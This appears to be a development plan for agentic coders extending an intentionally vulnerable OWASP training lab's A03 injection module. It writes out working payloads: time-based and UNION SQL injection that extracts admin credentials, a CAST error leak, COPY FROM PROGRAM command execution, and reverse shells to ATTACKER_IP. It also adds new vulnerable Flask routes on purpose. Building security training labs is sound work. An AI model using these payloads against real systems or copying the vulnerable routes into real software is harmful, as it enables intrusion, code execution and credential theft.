# A03 SQL/Command Injection Content Expansion Implementation Plan

> **For agentic workers:** REQUIRED SUB-SKILL: Use superpowers:subagent-driven-development (recommended) or superpowers:executing-plans to implement this plan task-by-task. Steps use checkbox (`- [ ]`) syntax for tracking.

**Goal:** Deepen A03 (Injection)'s existing SQL and OS command injection
teaching content — expand three existing examples' exploitation text, and
add two new examples (Error-Based SQL Injection, Advanced SQL Injection →
Remote Code Execution) to A03's existing "SQL Injection" group. This is
NOT a new category — every change lands inside the already-existing A03
blueprint.

**Architecture:** Three of the five components are content-only template
edits to already-existing, already-tested routes (no route/model changes,
no new tests). Two are brand-new routes reusing the existing `a03_secrets`
table (no new model). Every Postgres-specific technique in this plan
(character-by-character `pg_sleep` extraction, stacked queries, `COPY ...
FROM PROGRAM`, the `CAST` error-message leak) was empirically live-verified
against this app's real running docker-compose stack before this plan was
written — see the spec's Decisions section for exact verification
transcripts. Automated tests only ever exercise what's genuinely portable
to SQLite (this app's `TestConfig` backend); Postgres-only behavior is
documented as manually live-verified, exactly matching the precedent
already established by the existing Blind Time-Based SQLi example's own
test file.

**Tech Stack:** Flask 3.0.3, SQLAlchemy `text()` raw-SQL execution,
Jinja2 templates, pytest (all against SQLite in-memory, this app's
existing `TestConfig`).

**Spec:** `docs/superpowers/specs/2026-09-22-owasp-lab-a03-sqli-expansion-design.md`

## Global Constraints

- **Absolute hard rule, established after a real permission-boundary
  incident during this spec's own brainstorming**: no test, no
  implementer, and no reviewer may EVER open a live network listener or
  attempt to trigger/catch a real reverse-shell connection, for any
  reason, in any task. An attempt to do exactly this (fully contained
  within local Docker containers) was refused by the platform's own
  safety classifier during design and was not worked around — the design
  was revised instead. Every automated proof of command execution in this
  plan uses a safe, DB-readback mechanism (reading command output back
  through a normal `SELECT`) — never a live socket. The reverse-shell
  instructions in this plan (Tasks 3 and 5) are real, correct,
  manually-run exploitation content for a human learner only, and must
  never be executed by any automated component.
- Every Postgres-specific payload in this plan (character-by-character
  `pg_sleep` extraction, stacked queries, `COPY ... FROM PROGRAM`, the
  `CAST` error-message leak) was empirically verified against this app's
  real running docker-compose stack (`owasp-lab-app-1` +
  `owasp-lab-postgres-1` containers) using this app's exact
  `db.session.execute(text(query))` code path. Transcribe these exact
  payloads and confirmed output strings faithfully — do not "improve,"
  simplify, or second-guess them. Specific confirmed facts: the app's
  Postgres role (`lab`) is a superuser; `COPY <table> FROM PROGRAM 'id'`
  produced real output `uid=70(postgres) gid=70(postgres)
  groups=70(postgres)`; the `CAST` technique leaked the real seeded admin
  password `sup3r-s3cret-admin-pw`; the conditional `pg_sleep` idiom
  produced a genuine 3.02s vs. 0.00s timing split.
- Automated tests may only assert on what is genuinely portable to SQLite
  (this app's `TestConfig` database). Any payload requiring real Postgres
  semantics (stacked multi-statement execution, `pg_sleep`, `COPY FROM
  PROGRAM`, the Postgres-specific `CAST` error format) is shown only as
  static teaching text — documented as already live-verified per the
  point above, never re-attempted by pytest against SQLite.
- `tests/conftest.py` is off-limits — never modify it, for any reason, in
  any task.
- No new SQLAlchemy model, no new database table — both new examples
  (Tasks 4 and 5) query the existing `a03_secrets` table
  (`app/categories/a03_injection/models.py`'s `Secret` model, already
  seeded with two rows: an "Internal API Key" and a "Database Backup
  Location").
- Do not restructure `app/categories/a03_injection/routes.py` into
  multiple files. It is already the largest single-file routes module in
  this app; splitting it is an unrelated refactor out of scope for this
  plan.

---

## Task 1: Expand Blind Time-Based SQL Injection's Exploitation Text

**Files:**
- Modify: `app/categories/a03_injection/templates/a03_injection/check_username.html`

**Interfaces:**
- Consumes: nothing new — no route or model changes in this task.
- Produces: nothing new — this task changes only static template text.

This is a content-only task. There is no new code path to drive with a
failing test, so there is no "write the failing test" step — instead,
verify the existing test suite still passes unchanged after the edit.

- [ ] **Step 1: Expand the exploitation block**

Modify `app/categories/a03_injection/templates/a03_injection/
check_username.html` — the current `exploitation` block ends with:

```html
{% block exploitation %}
<ol>
  <li>Enter a username that definitely doesn't exist, e.g. <code>nobody</code>, and note
      the response is fast and reports "available."</li>
  <li>Now enter:
      <code>nobody' OR (SELECT 1 FROM pg_sleep(5))=1-- </code></li>
  <li>The page takes about 5 seconds to respond — even though the result is the same
      "available" you already know. That delay is entirely attacker-controlled: swap
      <code>5</code> for a boolean sub-query (e.g. testing one character of another
      user's password at a time) and the response time itself becomes the leaked signal,
      one true/false bit per request.</li>
</ol>
<p class="text-muted">
  Note: <code>pg_sleep</code> is PostgreSQL-specific — this timing behavior only shows up
  when running against the real Postgres-backed app under <code>docker compose up</code>,
  not in the lab's fast automated tests (which run against SQLite for speed).
</p>
<p>
  Blind and time-based SQL injection is the technique behind fully automated database
  takeovers in the wild — tools exist specifically because extracting a database one bit
  at a time by hand doesn't scale to a real schema. A single confirmed timing injection
  point like this one is often enough to justify pointing <code>sqlmap</code> at the
  endpoint and letting it enumerate the entire database, table by table, column by column,
  unattended — turning one manual timing test into a complete data exfiltration with no
  further human input required.
</p>
{% endblock %}
```

Replace this entire block with the following (adds a progressive
extraction walkthrough right after the existing 3-step list, before the
existing `pg_sleep`-is-Postgres-specific note and the closing paragraph,
both of which are preserved unchanged):

```html
{% block exploitation %}
<ol>
  <li>Enter a username that definitely doesn't exist, e.g. <code>nobody</code>, and note
      the response is fast and reports "available."</li>
  <li>Now enter:
      <code>nobody' OR (SELECT 1 FROM pg_sleep(5))=1-- </code></li>
  <li>The page takes about 5 seconds to respond — even though the result is the same
      "available" you already know. That delay is entirely attacker-controlled: swap
      <code>5</code> for a boolean sub-query (e.g. testing one character of another
      user's password at a time) and the response time itself becomes the leaked signal,
      one true/false bit per request.</li>
</ol>
<p>
  From there, the same conditional-sleep idiom extracts anything the database user can
  read, one true/false answer at a time:
</p>
<ul>
  <li>
    Confirm the database engine and version:
    <br>
    <code>nobody' OR (SELECT 1 FROM pg_sleep((SELECT CASE WHEN (SELECT version()) LIKE 'PostgreSQL 1%' THEN 5 ELSE 0 END)))=1-- </code>
  </li>
  <li>
    Confirm a specific table exists, without ever seeing its contents directly:
    <br>
    <code>nobody' OR (SELECT 1 FROM pg_sleep((SELECT CASE WHEN (SELECT COUNT(*) FROM information_schema.tables WHERE table_name='injection_accounts')=1 THEN 5 ELSE 0 END)))=1-- </code>
  </li>
  <li>
    Extract a username one character at a time:
    <br>
    <code>nobody' OR (SELECT 1 FROM pg_sleep((SELECT CASE WHEN (SELECT substring(username,1,1) FROM injection_accounts WHERE is_admin=true)='a' THEN 3 ELSE 0 END)))=1-- </code>
  </li>
  <li>
    Extract that account's password one character at a time, the exact same way:
    <br>
    <code>nobody' OR (SELECT 1 FROM pg_sleep((SELECT CASE WHEN (SELECT substring(password,1,1) FROM injection_accounts WHERE username='admin')='s' THEN 3 ELSE 0 END)))=1-- </code>
  </li>
</ul>
<p class="text-muted">
  Note: <code>pg_sleep</code> is PostgreSQL-specific — this timing behavior only shows up
  when running against the real Postgres-backed app under <code>docker compose up</code>,
  not in the lab's fast automated tests (which run against SQLite for speed).
</p>
<p>
  Blind and time-based SQL injection is the technique behind fully automated database
  takeovers in the wild — tools exist specifically because extracting a database one bit
  at a time by hand doesn't scale to a real schema. A single confirmed timing injection
  point like this one is often enough to justify pointing <code>sqlmap</code> at the
  endpoint and letting it enumerate the entire database, table by table, column by column,
  unattended — turning one manual timing test into a complete data exfiltration with no
  further human input required.
</p>
{% endblock %}
```

- [ ] **Step 2: Run the existing test file to confirm nothing broke**

Run: `.venv/bin/pytest tests/test_a03_check_username.py -v`
Expected: PASS (all existing tests still pass — this is a static-text-only
change, no route or query behavior changed).

- [ ] **Step 3: Run the full test suite**

Run: `.venv/bin/pytest tests/ -v`
Expected: all pass (414, no new tests in this task, no regressions).

- [ ] **Step 4: Commit**

```bash
git add app/categories/a03_injection/templates/a03_injection/check_username.html
git commit -m "docs(a03): expand blind-sqli exploitation text with version/table/credential extraction"
```

---

## Task 2: Expand UNION-Based SQL Injection's Exploitation Text + One New Portable Test

**Files:**
- Modify: `app/categories/a03_injection/templates/a03_injection/search.html`
- Test: `tests/test_a03_search.py`

**Interfaces:**
- Consumes: nothing new — no route or model changes in this task.
- Produces: nothing new — this task adds only static template text and one
  new test.

- [ ] **Step 1: Write the failing test**

Modify `tests/test_a03_search.py` — add this new test function (anywhere
in the file; suggested right after `test_search_union_exfiltrates_
secrets_table`):

```python
def test_search_union_exfiltrates_account_credentials(app, client):
    seed_database(app)
    payload = "' UNION SELECT id, username || ':' || password FROM injection_accounts -- "
    response = client.get("/a03/search", query_string={"q": payload})
    assert response.status_code == 200
    assert b"admin:sup3r-s3cret-admin-pw" in response.data
```

- [ ] **Step 2: Run test to verify it fails**

Run: `.venv/bin/pytest tests/test_a03_search.py::test_search_union_exfiltrates_account_credentials -v`
Expected: FAIL — the payload works against the route as-is (no route
change needed here, since `search()` already has no validation at all),
but the template doesn't need any change for this test to pass either.
**If this test already passes before Step 3**, that's fine and expected —
the vulnerable route already supports this payload identically to the
existing secrets-table payload; this step exists to confirm the payload
and expected output string are exactly correct before moving on.

- [ ] **Step 3: Expand the exploitation block**

Modify `app/categories/a03_injection/templates/a03_injection/search.html`
— the current `exploitation` block is:

```html
{% block exploitation %}
<ol>
  <li>Search for something normal first, e.g. <code>alice</code>, to see the expected
      two-column output.</li>
  <li>Now search for:
      <code>' UNION SELECT id, value FROM a03_secrets -- </code></li>
  <li>The results table now shows rows from the <code>a03_secrets</code> table — internal
      data this search box was never supposed to expose.</li>
</ol>
<p>
  UNION-based injection is the classic technique for turning one leaky search box into
  full database exfiltration — once an attacker determines the column count and types (by
  trial and error, e.g. incrementing the number of <code>NULL</code>s until the UNION
  succeeds), they can pull data from <em>any</em> table the database user can read, not
  just the one the search was designed for. Real-world breaches using this exact technique
  have exposed entire customer databases — usernames, password hashes, payment tokens —
  through search boxes that looked completely unrelated to sensitive data.
</p>
{% endblock %}
```

Replace it with (adds a fourth list item pulling real credentials, right
before the closing paragraph, which is preserved unchanged):

```html
{% block exploitation %}
<ol>
  <li>Search for something normal first, e.g. <code>alice</code>, to see the expected
      two-column output.</li>
  <li>Now search for:
      <code>' UNION SELECT id, value FROM a03_secrets -- </code></li>
  <li>The results table now shows rows from the <code>a03_secrets</code> table — internal
      data this search box was never supposed to expose.</li>
  <li>The same technique reaches any table, not just secrets. Search for:
      <code>' UNION SELECT id, username || ':' || password FROM injection_accounts -- </code>
      and the results table now shows full account credentials — every username paired
      with its real, plaintext password.</li>
</ol>
<p>
  UNION-based injection is the classic technique for turning one leaky search box into
  full database exfiltration — once an attacker determines the column count and types (by
  trial and error, e.g. incrementing the number of <code>NULL</code>s until the UNION
  succeeds), they can pull data from <em>any</em> table the database user can read, not
  just the one the search was designed for. Real-world breaches using this exact technique
  have exposed entire customer databases — usernames, password hashes, payment tokens —
  through search boxes that looked completely unrelated to sensitive data.
</p>
{% endblock %}
```

- [ ] **Step 4: Run test to verify it passes**

Run: `.venv/bin/pytest tests/test_a03_search.py -v`
Expected: PASS (all tests in this file, including the new one)

- [ ] **Step 5: Run the full test suite**

Run: `.venv/bin/pytest tests/ -v`
Expected: all pass (414 baseline + 1 new = 415).

- [ ] **Step 6: Commit**

```bash
git add app/categories/a03_injection/templates/a03_injection/search.html tests/test_a03_search.py
git commit -m "feat(a03): expand union-exfiltration to pull real account credentials"
```

---

## Task 3: Expand OS Command Injection's Exploitation Text (Reverse Shell)

**Files:**
- Modify: `app/categories/a03_injection/templates/a03_injection/host_lookup.html`

**Interfaces:**
- Consumes: nothing new — no route or model changes in this task.
- Produces: nothing new — this task changes only static template text.

**Reminder of this plan's Global Constraint**: this task adds real,
correct reverse-shell exploitation instructions as static teaching text
only. No test in this task (or anywhere in this plan) may open a network
listener or attempt to catch a live shell connection.

This is a content-only task. There is no new code path to drive with a
failing test — verify the existing test suite still passes unchanged
after the edit.

- [ ] **Step 1: Expand the exploitation block**

Modify `app/categories/a03_injection/templates/a03_injection/
host_lookup.html` — the current `exploitation` block is:

```html
{% block exploitation %}
<ol>
  <li>Try a normal lookup first, e.g. <code>localhost</code>.</li>
  <li>Now try: <code>localhost; whoami</code></li>
  <li>The output includes the result of <code>whoami</code> appended after the lookup —
      you've executed an arbitrary command on the server, running as whatever user the
      app container uses.</li>
  <li>Command substitution also works: <code>$(id)</code> runs <code>id</code> and
      substitutes its output directly into the "hostname" being looked up.</li>
</ol>
<p>
  OS command injection is consistently rated among the most severe web vulnerabilities
  because a successful exploit doesn't just leak data — it hands the attacker arbitrary
  code execution on the server itself, at whatever privilege level the app process runs
  as. In the wild this has been used to install web shells, pivot deeper into internal
  networks, exfiltrate entire filesystems, and establish persistent backdoors, all
  starting from a single unsanitized field passed to a shell.
</p>
{% endblock %}
```

Replace it with (adds a numbered reverse-shell delivery section right
after the existing 4-step list, before the closing paragraph, which is
preserved unchanged):

```html
{% block exploitation %}
<ol>
  <li>Try a normal lookup first, e.g. <code>localhost</code>.</li>
  <li>Now try: <code>localhost; whoami</code></li>
  <li>The output includes the result of <code>whoami</code> appended after the lookup —
      you've executed an arbitrary command on the server, running as whatever user the
      app container uses.</li>
  <li>Command substitution also works: <code>$(id)</code> runs <code>id</code> and
      substitutes its output directly into the "hostname" being looked up.</li>
</ol>
<p>
  A single command's output is a proof-of-concept. A real attacker escalates to a
  persistent, interactive foothold instead:
</p>
<ol>
  <li>Start a listener on your own machine:
      <code>nc -lvnp 4444</code></li>
  <li>Submit this as the hostname (the trailing <code>&amp;</code> backgrounds the reverse
      shell so the request itself returns immediately, instead of hanging until this
      route's 10-second timeout kills it):
      <br>
      <code>localhost; nc -e /bin/sh ATTACKER_IP 4444 &amp;</code></li>
  <li>Your listener now has an interactive shell on the target. If the target doesn't have
      <code>nc -e</code> compiled in, bash's own <code>/dev/tcp</code> feature works
      identically with no extra tools required:
      <br>
      <code>localhost; bash -c 'bash -i &gt;&amp; /dev/tcp/ATTACKER_IP/4444 0&gt;&amp;1' &amp;</code></li>
</ol>
<p>
  OS command injection is consistently rated among the most severe web vulnerabilities
  because a successful exploit doesn't just leak data — it hands the attacker arbitrary
  code execution on the server itself, at whatever privilege level the app process runs
  as. In the wild this has been used to install web shells, pivot deeper into internal
  networks, exfiltrate entire filesystems, and establish persistent backdoors, all
  starting from a single unsanitized field passed to a shell.
</p>
{% endblock %}
```

Note the HTML-entity-escaped characters in the third bullet's
`bash -i >& /dev/tcp/...` payload (`&gt;`, `&amp;`) — this is a literal
shell redirection payload containing `>` and `&` characters, and since
Jinja does not autoescape static block content (only `{{ }}` expressions),
these must be written as HTML entities in the template source so the
browser displays the literal characters rather than misinterpreting them.
Transcribe this exactly as shown — do not "clean up" the entities back to
raw `>`/`&`.

- [ ] **Step 2: Run the existing test file to confirm nothing broke**

Run: `.venv/bin/pytest tests/test_a03_host_lookup.py -v`
Expected: PASS (all existing tests still pass — this is a static-text-only
change, no route behavior changed).

- [ ] **Step 3: Run the full test suite**

Run: `.venv/bin/pytest tests/ -v`
Expected: all pass (415 baseline from Task 2, no new tests in this task,
no regressions).

- [ ] **Step 4: Commit**

```bash
git add app/categories/a03_injection/templates/a03_injection/host_lookup.html
git commit -m "docs(a03): add reverse-shell delivery instructions to command-injection example"
```

---

## Task 4: New Example — Error-Based SQL Injection (Medium)

**Files:**
- Modify: `app/categories/a03_injection/routes.py`
- Modify: `app/categories/a03_injection/__init__.py`
- Create: `app/categories/a03_injection/templates/a03_injection/product_lookup.html`
- Test: `tests/test_a03_product_lookup.py`

**Interfaces:**
- Consumes: `a03_bp`, `db`, `text` (all already imported in `routes.py` —
  do not re-import), the existing `Secret` model / `a03_secrets` table
  (already seeded with two rows by `seed_injection_data()`).
- Produces: Route endpoint `a03_injection.product_lookup` → `GET/POST
  /a03/product-lookup`.

- [ ] **Step 1: Write the failing test**

Create `tests/test_a03_product_lookup.py`:

```python
from app.categories.a03_injection.models import Secret
from app.core.seed import seed_database


def test_product_lookup_page_renders(client):
    response = client.get("/a03/product-lookup")
    assert response.status_code == 200


def test_product_lookup_finds_a_legitimate_product(app, client):
    seed_database(app)
    with app.app_context():
        secret = Secret.query.filter_by(label="Internal API Key").first()
        secret_id = secret.id

    response = client.post("/a03/product-lookup", data={"product_id": str(secret_id)})
    assert response.status_code == 200
    assert b"sk_live_51NxFakeKeyForTraining000" in response.data


def test_product_lookup_surfaces_raw_database_error_on_broken_syntax(client):
    # A lone single quote breaks the raw SQL string open -- this is
    # portable across SQLite and Postgres alike (both raise a syntax
    # error for an unterminated string literal), unlike the Postgres-only
    # CAST-based data-leaking payload shown in this example's own
    # teaching text, which this test deliberately does not attempt.
    response = client.post("/a03/product-lookup", data={"product_id": "'"})
    assert response.status_code == 200
    assert b"unrecognized token" in response.data


def test_product_lookup_link_appears_in_overview_once_registered(client):
    response = client.get("/a03/")
    assert response.status_code == 200
    assert b"Error-Based SQL Injection via Product Lookup" in response.data
    assert b'href="/a03/product-lookup"' in response.data
```

- [ ] **Step 2: Run test to verify it fails**

Run: `.venv/bin/pytest tests/test_a03_product_lookup.py -v`
Expected: FAIL — 404 (no route yet).

- [ ] **Step 3: Add the route**

Modify `app/categories/a03_injection/routes.py` — after the
`generate_report()` route (the last route currently in the file), add:

```python


@a03_bp.route("/product-lookup", methods=["GET", "POST"])
def product_lookup():
    product_id = ""
    result = None
    error = None
    if request.method == "POST":
        product_id = request.form.get("product_id", "")
        try:
            # VULNERABLE: raw string-concatenated SQL, no parameterization
            # -- and the raw database exception is shown directly to the
            # user as "helpful" debugging output, turning a syntax or
            # type-mismatch error into a data-exfiltration channel.
            query = f"SELECT * FROM a03_secrets WHERE id = {product_id}"
            result = db.session.execute(text(query)).mappings().first()
        except Exception as e:
            db.session.rollback()
            error = str(e)
    return render_template(
        "a03_injection/product_lookup.html",
        product_id=product_id,
        result=result,
        error=error,
    )
```

- [ ] **Step 4: Add the ExampleNav entry**

Modify `app/categories/a03_injection/__init__.py` — in the
`examples=[...]` list, insert the new entry between the `roster-sort` and
`blind-sqli` entries (so the "SQL Injection" group stays Easy→Hard
sorted: sqli-login Easy, union-exfiltration Medium, roster-sort Medium,
error-based-sqli Medium, blind-sqli Hard, roster-lookup Hard):

```python
            ExampleNav(
                id="error-based-sqli",
                title="Error-Based SQL Injection via Product Lookup",
                group="SQL Injection",
                difficulty="Medium",
                endpoint="a03_injection.product_lookup",
            ),
```

- [ ] **Step 5: Create the template**

Create `app/categories/a03_injection/templates/a03_injection/product_lookup.html`:

```html
{% extends "core/example_page_base.html" %}
{% set example_title = "Error-Based SQL Injection via Product Lookup" %}
{% set example_difficulty = "Medium" %}
{% block title %}{{ example_title }} — A03{% endblock %}

{% block explanation %}
<p>
  This "look up a product by ID" feature builds its query with raw string
  concatenation, same as every other SQLi example here — but this one has
  an additional flaw: it catches whatever database error results from a
  broken query and displays the raw exception text as "helpful"
  diagnostic output. That single design choice turns a type-mismatch
  error into a genuine data-exfiltration channel, no timing measurement
  or blind boolean guessing required.
</p>
{% endblock %}

{% block detect %}
<p>
  Enter a single quote on its own, <code>'</code>, and submit. The query breaks open and
  the raw database error comes straight back in the response — confirming both that the
  input reaches raw SQL, and that this application shows you exactly what the database
  says when something goes wrong.
</p>
{% endblock %}

{% block exploitation %}
<ol>
  <li>Look up a real product ID first (any small integer) to see the normal, working
      response.</li>
  <li>Now submit:
      <code>1 AND CAST((SELECT password FROM injection_accounts WHERE username='admin') AS int) &gt; 0</code></li>
  <li>PostgreSQL tries to convert the extracted password string into an integer to satisfy
      the comparison, fails, and raises an error that includes the value it was trying to
      convert — the admin account's real, plaintext password, sitting right there in the
      "helpful" error message: <code>invalid input syntax for type integer:
      "sup3r-s3cret-admin-pw"</code>.</li>
</ol>
<p class="text-muted">
  Note: this exact error message format is PostgreSQL-specific — verified live against the
  real Postgres-backed app under <code>docker compose up</code>, not reproduced by the
  lab's fast automated tests (which run against SQLite for speed, and SQLite doesn't have
  the same strict integer-cast behavior).
</p>
<p>
  Error-based SQL injection turns an application's own debugging convenience against it —
  no blind boolean guessing, no timing side-channels, just one crafted query and whatever
  data you can coerce the database into printing back in its complaint about it. It's one
  of the fastest data-exfiltration techniques available once an unhandled or
  over-helpfully-displayed database error is found.
</p>
{% endblock %}

{% block vulnerable_code %}try:
    query = f"SELECT * FROM a03_secrets WHERE id = {product_id}"
    result = db.session.execute(text(query)).mappings().first()
except Exception as e:
    # VULNERABLE: the raw exception text is shown directly to the user
    error = str(e)
{% endblock %}

{% block secure_code %}try:
    query = text("SELECT * FROM a03_secrets WHERE id = :product_id")
    result = db.session.execute(query, {"product_id": product_id}).mappings().first()
except Exception:
    # Never surface raw database exceptions to the user -- log them
    # server-side and show a generic message instead.
    error = "Something went wrong. Please try again."
{% endblock %}

{% block live_example %}
<form method="post">
  <div class="input-group mb-3">
    <input type="text" class="form-control" name="product_id" value="{{ product_id }}" placeholder="Enter a product ID">
    <button type="submit" class="btn btn-primary">Look Up</button>
  </div>
</form>
{% if result %}
<p>Label: {{ result.label }}</p>
<p>Value: {{ result.value }}</p>
{% endif %}
{% if error %}
<p class="text-danger">Error: {{ error }}</p>
{% endif %}
{% endblock %}
```

Note the HTML-entity-escaped `&gt;` in the exploitation block's payload
(`... AS int) &gt; 0`) — this is a literal `>` character in a SQL payload
shown as static text; since Jinja does not autoescape static block
content, it must be written as `&gt;` in the template source so the
browser renders a literal `>` rather than attempting to parse it as a tag
boundary. Transcribe this exactly as shown.

Note also: neither this template's static prose nor its code blocks ever
state the literal phrase `"unrecognized token"` (the SQLite error message
Task 4's own test asserts on) — only the illustrative Postgres error
message (`invalid input syntax for type integer: "sup3r-s3cret-admin-pw"`)
appears as static text, which is a different string entirely. This keeps
the SQLite-based test's assertion non-vacuous.

- [ ] **Step 6: Run tests to verify they pass**

Run: `.venv/bin/pytest tests/test_a03_product_lookup.py -v`
Expected: PASS (4 passed)

- [ ] **Step 7: Run the full test suite**

Run: `.venv/bin/pytest tests/ -v`
Expected: all pass (415 baseline from Task 2 + 4 new = 419).

- [ ] **Step 8: Commit**

```bash
git add app/categories/a03_injection tests/test_a03_product_lookup.py
git commit -m "feat(a03): add error-based-sqli example"
```

---

## Task 5: New Example — Advanced SQL Injection: From Detection to Remote Code Execution (Hard)

**Files:**
- Modify: `app/categories/a03_injection/routes.py`
- Modify: `app/categories/a03_injection/__init__.py`
- Create: `app/categories/a03_injection/templates/a03_injection/inventory_lookup.html`
- Test: `tests/test_a03_inventory_lookup.py`

**Interfaces:**
- Consumes: `a03_bp`, `db`, `text` (already imported), the existing
  `Secret` model / `a03_secrets` table (already seeded, two rows).
- Produces: Route endpoint `a03_injection.inventory_lookup` → `GET/POST
  /a03/inventory-lookup`.

**Reminder of this plan's Global Constraint**: this task's exploitation
text includes real reverse-shell escalation instructions (Step 4 of the
teaching walkthrough below). No test in this task may open a network
listener or attempt to catch a live shell connection — the automated test
for command execution uses the safe DB-readback method only (`COPY FROM
PROGRAM` writing to a table, read back via `SELECT`), and even that
specific Postgres-only mechanism is NOT re-tested by pytest against
SQLite (SQLite supports neither multi-statement `execute()` calls nor
`COPY` syntax at all) — it is documented as already live-verified per this
plan's Global Constraints section. Only the portable boolean-injection
step is covered by an automated test in this task.

- [ ] **Step 1: Write the failing test**

Create `tests/test_a03_inventory_lookup.py`:

```python
from app.categories.a03_injection.models import Secret
from app.core.seed import seed_database


def test_inventory_lookup_page_renders(client):
    response = client.get("/a03/inventory-lookup")
    assert response.status_code == 200


def test_inventory_lookup_counts_a_legitimate_sku(app, client):
    seed_database(app)
    with app.app_context():
        secret_id = Secret.query.first().id

    response = client.post("/a03/inventory-lookup", data={"sku": str(secret_id)})
    assert response.status_code == 200
    assert b"Inventory count: 1" in response.data


def test_inventory_lookup_boolean_injection_returns_the_full_table_count(app, client):
    # Portable boolean-based injection: "0 OR 1=1" makes every row match,
    # proving the field reaches raw SQL. This test deliberately stops
    # here -- the stacked-query and COPY FROM PROGRAM escalation shown in
    # this example's own teaching text is Postgres-specific and was
    # already live-verified against the real app (see this plan's Global
    # Constraints); it is never attempted against SQLite here.
    seed_database(app)
    response = client.post("/a03/inventory-lookup", data={"sku": "0 OR 1=1"})
    assert response.status_code == 200
    assert b"Inventory count: 2" in response.data


def test_inventory_lookup_link_appears_in_overview_once_registered(client):
    response = client.get("/a03/")
    assert response.status_code == 200
    assert b"Advanced SQL Injection: From Detection to Remote Code Execution" in response.data
    assert b'href="/a03/inventory-lookup"' in response.data
```

- [ ] **Step 2: Run test to verify it fails**

Run: `.venv/bin/pytest tests/test_a03_inventory_lookup.py -v`
Expected: FAIL — 404 (no route yet).

- [ ] **Step 3: Add the route**

Modify `app/categories/a03_injection/routes.py` — after the
`product_lookup()` route added in Task 4, add:

```python


@a03_bp.route("/inventory-lookup", methods=["GET", "POST"])
def inventory_lookup():
    sku = ""
    count = None
    error = None
    if request.method == "POST":
        sku = request.form.get("sku", "")
        try:
            # VULNERABLE: raw string-concatenated SQL passed to a driver
            # that permits multiple, semicolon-separated statements in
            # one call -- there is no query-count restriction, so an
            # attacker who can inject one statement can inject an
            # unlimited chain of them.
            query = f"SELECT COUNT(*) FROM a03_secrets WHERE id = {sku}"
            count = db.session.execute(text(query)).scalar()
            db.session.commit()
        except Exception as e:
            db.session.rollback()
            error = str(e)
    return render_template(
        "a03_injection/inventory_lookup.html",
        sku=sku,
        count=count,
        error=error,
    )
```

- [ ] **Step 4: Add the ExampleNav entry**

Modify `app/categories/a03_injection/__init__.py` — in the
`examples=[...]` list, insert the new entry after the `roster-lookup`
entry and before the `reflected-xss` entry (the last entry in the "SQL
Injection" group, keeping the group Easy→Hard sorted: ... blind-sqli
Hard, roster-lookup Hard, sqli-to-rce Hard):

```python
            ExampleNav(
                id="sqli-to-rce",
                title="Advanced SQL Injection: From Detection to Remote Code Execution",
                group="SQL Injection",
                difficulty="Hard",
                endpoint="a03_injection.inventory_lookup",
            ),
```

- [ ] **Step 5: Create the template**

Create `app/categories/a03_injection/templates/a03_injection/inventory_lookup.html`:

```html
{% extends "core/example_page_base.html" %}
{% set example_title = "Advanced SQL Injection: From Detection to Remote Code Execution" %}
{% set example_difficulty = "Hard" %}
{% block title %}{{ example_title }} — A03{% endblock %}

{% block explanation %}
<p>
  This "check inventory count by ID" feature has the same raw
  string-concatenated SQL flaw as every other example in this group — but
  here the database driver in use permits multiple, semicolon-separated
  statements in a single query call. That single property turns "just a
  SQL injection" into full command execution on the database server
  itself, because an attacker isn't limited to one <code>SELECT</code> —
  they can inject an entire chain of statements, including ones that ask
  PostgreSQL to run an arbitrary OS command.
</p>
{% endblock %}

{% block detect %}
<p>
  Enter a value that definitely doesn't exist, e.g. <code>999999</code>, and note the
  response reports zero matches. Then try <code>0 OR 1=1</code> and note the count jumps
  to the full table size — confirming the field reaches raw SQL in a numeric context, no
  string literal to break out of at all.
</p>
{% endblock %}

{% block exploitation %}
<ol>
  <li>
    Detect the injection point:
    <br>
    <code>0 OR 1=1</code>
  </li>
  <li>
    Confirm stacked queries are accepted (a harmless no-op statement appended after a
    semicolon):
    <br>
    <code>1; SELECT 1--</code>
  </li>
  <li>
    Escalate to command execution — the safe way to prove it: read the command's output
    back through the database itself, no network connection involved.
    <br>
    <code>1; DROP TABLE IF EXISTS a03_rce_check; CREATE TABLE a03_rce_check (output text); COPY a03_rce_check FROM PROGRAM 'id'; --</code>
    <br>
    Look up any SKU again afterward — the database now contains a real
    <code>a03_rce_check</code> table holding this server's actual <code>id</code> command
    output.
  </li>
  <li>
    Escalate further to a real, interactive reverse shell. This step is a manual exercise
    for your own terminal against your own deployment — this lab's automated tests never
    do this:
    <br>
    <code>1; COPY (SELECT 1) TO PROGRAM 'nc -e /bin/sh ATTACKER_IP 4444'; --</code>
  </li>
</ol>
<p class="text-muted">
  Note: stacked queries and <code>COPY ... FROM/TO PROGRAM</code> are PostgreSQL-specific
  and were live-verified against the real Postgres-backed app under
  <code>docker compose up</code>, not reproduced by the lab's fast automated tests (SQLite
  supports neither multi-statement execution nor <code>COPY</code> at all).
</p>
<p>
  This escalation only works because the database role this application connects with is
  a PostgreSQL superuser — <code>COPY ... FROM/TO PROGRAM</code> is restricted to
  superusers (or roles explicitly granted the <code>pg_execute_server_program</code> role)
  specifically because of exactly this risk. A properly least-privileged database
  account — one without superuser rights and without that role grant — would block this
  specific escalation path entirely, even though the underlying SQL injection
  vulnerability would still exist.
</p>
{% endblock %}

{% block vulnerable_code %}query = f"SELECT COUNT(*) FROM a03_secrets WHERE id = {sku}"
count = db.session.execute(text(query)).scalar()
db.session.commit()
# no parameterization, and the database driver permits stacked,
# semicolon-separated statements with no restriction on how many
{% endblock %}

{% block secure_code %}query = text("SELECT COUNT(*) FROM a03_secrets WHERE id = :sku")
count = db.session.execute(query, {"sku": sku}).scalar()
# parameterized queries can never contain a second statement at all --
# and the connecting database role should never be a superuser in the
# first place
{% endblock %}

{% block live_example %}
<form method="post">
  <div class="input-group mb-3">
    <input type="text" class="form-control" name="sku" value="{{ sku }}" placeholder="Enter a SKU (numeric ID)">
    <button type="submit" class="btn btn-primary">Check Inventory</button>
  </div>
</form>
{% if count is not none %}
<p>Inventory count: {{ count }}</p>
{% endif %}
{% if error %}
<p class="text-danger">Error: {{ error }}</p>
{% endif %}
{% endblock %}
```

Note: this template's static teaching prose never states the literal
phrase `"Inventory count: 1"` or `"Inventory count: 2"` anywhere — the
dynamic count is only ever rendered via the `{{ count }}` Jinja
expression in `live_example`, never hardcoded as illustrative text. This
keeps both of Task 5's count-based test assertions non-vacuous.

- [ ] **Step 6: Run tests to verify they pass**

Run: `.venv/bin/pytest tests/test_a03_inventory_lookup.py -v`
Expected: PASS (4 passed)

- [ ] **Step 7: Run the full test suite**

Run: `.venv/bin/pytest tests/ -v`
